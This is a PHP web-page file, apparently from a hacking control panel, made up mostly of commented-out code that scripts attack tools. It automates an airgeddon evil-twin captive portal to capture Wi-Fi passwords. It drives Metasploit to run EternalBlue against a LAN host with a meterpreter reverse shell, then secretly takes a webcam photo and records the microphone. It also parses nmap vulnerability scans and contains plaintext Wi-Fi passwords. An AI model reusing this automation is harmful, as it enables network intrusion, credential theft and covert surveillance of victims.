<?php $dir = "/example-app/resources/views"; ?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- <link rel="stylesheet" href="/example-app/resources/css/style.css"> -->
    <title>PHP Variables</title>
</head>

<body>


    <?php
        // shell_exec('cd airgeddon');
        
        

        // shell_exec('cd airgeddon');
        
        // $out = shell_exec('dir');
        
        // ob_start();
         //echo shell_exec('whoami');
         //echo shell_exec('ls -lh ./airgeddon');

        //  $output = shell_exec('sudo  ./airgeddon/airgeddon.sh');
         
        //  // $ouput = shell_exec('1');
         
        //  // shell_exec('2');
        //  // shell_exec('7');
        //  // shell_exec('9');
        //  echo $output;
        //  //runCommand('sudo bash ./airgeddon/airgeddon.sh 2>&1');
        //  //runCommand('sudo bash ./airgeddon/airgeddon.sh');
        // //  ob_end_clean();  
        // // echo $out;   
        
        // function runCommand($command)
        // {            
        //     $output = shell_exec($command); 
            
        //     if ($output === null) { 
        //         // Ghi nhật ký lỗi 
        //         error_log("Lỗi khi chạy lệnh bash: " . error_get_last()['message']); 
        //     } else { 
        //         // In kết quả đầu ra 
        //         echo $output; 
        //     }
        // }
                //Run the bash script

            // exec('sudo bash ./airgeddon/airgeddon.sh');
            // exec('\n\n\n');
            // exec('2');
            // exec('2');
            // exec('7');
            // exec('9');
            // control_c();
            //$output = exec('sudo bash ./airgeddon/airgeddon.sh');
            //exec('1');            
            //exec('2');
            //exec('7');
            //exec('9');

            // include '/opt/lampp/htdocs/example-app/command.php';
            // //runCommand('sudo bash ./airgeddon/scanwifi.sh');
            // //echo "sudo kill $(ps aux | grep 'airodump-ng' | awk '{print $2}')";
            // // attack2(3, "DLX-Test-2");
            // //echo scanWifi();
            // echo attack(5, "Danh wifi 2.4");

            // function attack2($slelectedValue, $essid)
            // {        
            //     shell_exec("sudo rm -rf '/tmp/evil_twin_captive_portal_password-${essid}.txt' > /dev/null 2>&1"); 
            //     $descriptors = [['pipe', 'r'], ['pipe', 'w'], ['pipe', 'w']];
            //     $process = proc_open("sudo bash ./airgeddon/attack.sh", $descriptors, $pipes); 
            //     $status = proc_get_status($process);
            //     if (is_resource($process)) 
            //     {                    
            //         fwrite($pipes[0], "\n");
            //         fwrite($pipes[0], "\n");
            //         fwrite($pipes[0], "\n");
            //         fwrite($pipes[0], "2\n");
            //         fwrite($pipes[0], "2\n");
            //         fwrite($pipes[0], "\n");                                    
            //         fwrite($pipes[0], "7\n");
            //         fwrite($pipes[0], "9\n");
            //         fwrite($pipes[0], "\n");
            //         fwrite($pipes[0], "\n");
            //         fwrite($pipes[0], "$slelectedValue\n");
            //         fwrite($pipes[0], "2\n");
            //         fwrite($pipes[0], "N\n");
            //         fwrite($pipes[0], "Y\n");
            //         fwrite($pipes[0], "N\n");
            //         fwrite($pipes[0], "\n");
            //         fwrite($pipes[0], "\n");
            //         fwrite($pipes[0], "\n");
            //         fwrite($pipes[0], "\n");
            //         fwrite($pipes[0], "/tmp/evil_twin_captive_portal_password-${essid}.txt\n");
            //         fwrite($pipes[0], "\n");
            //         fwrite($pipes[0], "1\n");
            //         fwrite($pipes[0], "Y\n");
            //         fwrite($pipes[0], "\n");          
                     
            //         $n = 0;
            //         while(!file_exists("/tmp/evil_twin_captive_portal_password-${essid}.txt"))
            //         {
            //             echo "$n<br/>";
            //             $n++;
            //             sleep(1);
            //         }           

            //         sleep(1);
            //         fwrite($pipes[0], "\n");
                    
            //         fclose($pipes[1]);                    
            //         fclose($pipes[0]);

            //         proc_terminate($status['pid'], 9);

            //         echo "End attack"."<br/>";

            //         return true;
            //     }        
            //     return false;
            // }

            // function runCommand($command)
            // {            
            //     shell_exec("sudo rm -rf '/tmp/explorewifi.txt' > /dev/null 2>&1");                
            //     $descriptors = [['pipe', 'r'], ['pipe', 'w'], ['pipe', 'w']];
            //     $process = proc_open($command, $descriptors, $pipes); 
                
            //     if (is_resource($process)) {       
            //         $status = proc_get_status($process);             
            //         fwrite($pipes[0], "\n");
            //         fwrite($pipes[0], "\n");
            //         fwrite($pipes[0], "\n");
            //         fwrite($pipes[0], "2\n");
            //         fwrite($pipes[0], "2\n");
            //         fwrite($pipes[0], "\n");                                    
            //         fwrite($pipes[0], "7\n");
            //         fwrite($pipes[0], "9\n");
            //         fwrite($pipes[0], "\n");
            //         fwrite($pipes[0], "\n");
                    
            //         // while($output = fgets($pipes[1]))
            //         // {
            //         //     echo $output . "<br>";
            //         //     sleep(1);
            //         //     if(file_exists("/tmp/explorewifi.txt")){
            //         //         sleep(10);
            //         //         echo shell_exec("sudo kill $(ps aux | grep 'airodump-ng' | awk '{print $2}')");      
            //         //         sleep(2);
            //         //         $homepage = file_get_contents('/tmp/wnws.txt');
            //         //         echo $homepage."<br>";
            //         //         echo shell_exec("sudo rm -rf '/tmp/explorewifi.txt' > /dev/null 2>&1");
            //         //         break;
            //         //     }
            //         // }

            //         while(!file_exists("/tmp/explorewifi.txt"))
            //         {
            //             sleep(1);
            //         }

            //         sleep(10);
            //         shell_exec("sudo kill $(ps aux | grep 'airodump-ng' | awk '{print $2}')");      
            //         sleep(2);
            //         $homepage = file_get_contents('/tmp/wnws.txt');
            //         echo $homepage."<br>";
            //         shell_exec("sudo rm -rf '/tmp/explorewifi.txt' > /dev/null 2>&1");


            //         fclose($pipes[1]);                    
            //         fclose($pipes[0]);

            //         // sleep(10);
                
            //         //echo "Close!";            //         //die();
            //         //$return_value = proc_close($process);                    
            //         proc_terminate($status['pid'], 9);
                    
            //         return true;
            //     }
            // }

            // echo "End!";

            // function manage_captive_portal_log() {

            //     debug_print
            
            //     default_et_captive_portal_logpath="${default_save_path}"
            //     default_et_captive_portallogfilename="evil_twin_captive_portal_password-${essid}.txt"
            //     default_et_captive_portal_logpath="${default_et_captive_portal_logpath}${default_et_captive_portallogfilename}"
            //     validpath=1
            //     while [[ "${validpath}" != "0" ]]; do
            //         read_path "et_captive_portallog"
            //     done
            // }
            

    //         function test() {
    //             shell_exec("sudo rm -rf '/tmp/error-output.txt' > /dev/null 2>&1"); 
    //             shell_exec("sudo rm -rf '/opt/lampp/htdocs/eviltwin/screenview/t.jpeg' > /dev/null 2>&1"); 
    //             shell_exec("sudo rm -rf '/opt/lampp/htdocs/eviltwin/screenview/s.wav' > /dev/null 2>&1"); 
    //             $descriptors = [['pipe', 'r'], ['pipe', 'w'], ["file", "/tmp/error-output.txt", "a"]];
    //             $process = proc_open(' cd /home/phphuc && msfconsole', $descriptors, $pipes); 
    //             $status = proc_get_status($process);
    //             if (is_resource($process)) 
    //             {
    //                 fwrite($pipes[0], "use exploit/windows/smb/ms17_010_eternalblue\n");
    //                 fwrite($pipes[0], "set PAYLOAD payload/windows/x64/meterpreter/reverse_tcp\n");
    //                 // fwrite($pipes[0], "set RHOST 172.16.86.124\n");
    //                 fwrite($pipes[0], "set RHOST 172.16.85.214\n");
                    
    //                 // fwrite($pipes[0], "set LHOST 172.16.86.249\n"); 
    //                 fwrite($pipes[0], "set LHOST 172.16.85.219\n"); 
                    
    //                 fwrite($pipes[0], "exploit\n");
    //                 fwrite($pipes[0], "webcam_snap -p /opt/lampp/htdocs/eviltwin/screenview/t.jpeg\n");
    //                 fwrite($pipes[0], "record_mic -d 10 -f /opt/lampp/htdocs/eviltwin/screenview/s.wav\n");
                    
    //                 fclose($pipes[0]);
    //                 ob_start();
    //                 echo "<pre>" . stream_get_contents($pipes[1]) . "</pre>";
    //                 ob_end_clean();
    //                 fclose($pipes[1]);
    //                 proc_close($process);
                    
    //                     if (file_exists("/opt/lampp/htdocs/eviltwin/screenview/t.jpeg"))
    //                     {
    //                         echo "Success";
    //                         exit;
    //                     }
    //                 }
    //                 echo "Fail";




    //             // shell_exec("sudo rm -rf '/tmp/t.txt' > /dev/null 2>&1"); 
    //             // shell_exec("sudo rm -rf '/tmp/connect.txt' > /dev/null 2>&1"); 

    //             // // shell_exec("sudo service NetworkManager restart");
    //             // shell_exec("nmcli d wifi connect 'baonq std' password 12345678 >> /tmp/connect.txt 2>&1 ");
    //             // $data = file_get_contents("/tmp/connect.txt");    
    //             // echo "<pre>".$data."</pre>";
    //             // echo gettype($data);
    //             // if(strpos($data, 'Error:') === false) {
    //             //     echo "Success";
    //             // } else {
    //             //     echo "Error";
    //             // };

    //             // $descriptors = [['pipe', 'r'], ['pipe', 'w'], ['file', '/tmp/output.txt','a']];
    //             // $process = proc_open('cd /home', $descriptors, $pipes); 
    //             // $status = proc_get_status($process);
    //             // if (is_resource($process)) 
    //             // {
    //             //     fwrite($pipes[0], "nmcli d wifi connect 'SafeGate-Hien' password 12345678 ifname wlan0\n");
    //             //     fwrite($pipes[0], "sleep 10\n");
    //             //     fclose($pipes[0]);
    //             //     echo "<pre>" . stream_get_contents($pipes[1]) . "</pre>";
    //             //     fclose($pipes[1]);
    //             //     proc_close($process);
    //             // }
    //         }

    //         test();

    if(file_exists("/tmp/getVuln.txt")){
        $arr = array();
        foreach(file("/tmp/getVuln.txt") as $line) {
            //get port
            if (is_numeric($line[0])){
                $arrPort[] = $line;
            }
                        
            //get OS
            if (strpos($line, 'Running') === 0) {
                $OS = explode(":",$line);
                $arr['OS'] = $OS[1];
            }

            // get name           
            if(strpos($line, "| nbstat:") === 0){
                $data = explode(",",$line);
                $name = explode(":" ,$data[0]);
                $arr['name'] = $name[2];
            }

           
        }


        $data = file_get_contents("/tmp/getVuln.txt");

        $start_pos = strpos($data, 'PORT');
        $end_pos = strpos($data, 'MAC');

        $substring = substr($data, $start_pos, $end_pos - $start_pos );
        
        $arr["portVuln"] = $substring;

        echo json_encode($arr);
        } else {
            return '';
        }
    // return "Fail";
    
        
        // echo(count($arr[0]));



        // foreach(file("/tmp/scanDevice.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
        //     $item = explode("\t", $line);
        //     $arrItem['ip'] =  $item[0];
        //     $arrItem['mac'] =  $item[1];
        //     $arrItem['hostname'] =  $item[2];               
        //     $arr[] = $arrItem; 
        // }
        // var_dump($arr);
        // return json_encode($arr);
    // }

    ?>

</body>

</html>